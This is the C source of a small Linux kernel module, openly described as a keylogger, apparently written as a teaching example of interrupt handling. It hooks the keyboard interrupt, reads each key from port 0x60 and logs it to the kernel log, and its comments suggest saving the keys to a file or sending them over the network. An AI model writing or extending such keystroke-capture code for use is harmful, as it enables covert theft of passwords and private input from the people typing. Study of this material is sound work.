#include <linux/module.h>    // needed for all kernel modules
#include <linux/kernel.h>    // needed for KERN_INFO
#include <linux/init.h>      // needed for __init and __exit macros
#include <linux/interrupt.h> // needed for interrupts

// The function that will be called by the interrupt
static irqreturn_t irq_handler(int irq, void *id)
{

        /*
        put here all your code
        change the interrupt number to react to other hardware interrupt
        */

        char c=0;
        // get the key pressed
        c = inb(0x60);

        // you can now register the event as you want
        // inside a file or via the network or other

        printk(KERN_INFO "keyboard %c has been pressed\n",c);
        return IRQ_HANDLED;
}

static int __init keylogger_init(void)
{
    printk(KERN_INFO "Hello, interrupt\n");

// request interrupt for keyboard (number 1)
    request_irq(1,irq_handler,IRQF_SHARED, THIS_MODULE->name, THIS_MODULE->name);
    return 0;    // Non-zero return means that the module couldn't be loaded.
}

static void __exit keylogger_cleanup(void)
{
// realease the irq but just for this module, the keyboard will still work
  free_irq(1, THIS_MODULE->name);
  printk(KERN_INFO "Good bye, interrupt.\n");
}

//These are some useful information that could reveald with modinfo command
//Set module license to get rid of tainted kernel warnings
MODULE_LICENSE("GPL");
//Introduce the module's developer and it's functionality
MODULE_AUTHOR("Arnaud Meauzoone");
MODULE_DESCRIPTION("This is just a simple driver that implement a keylogger");

module_init(keylogger_init);
module_exit(keylogger_cleanup);
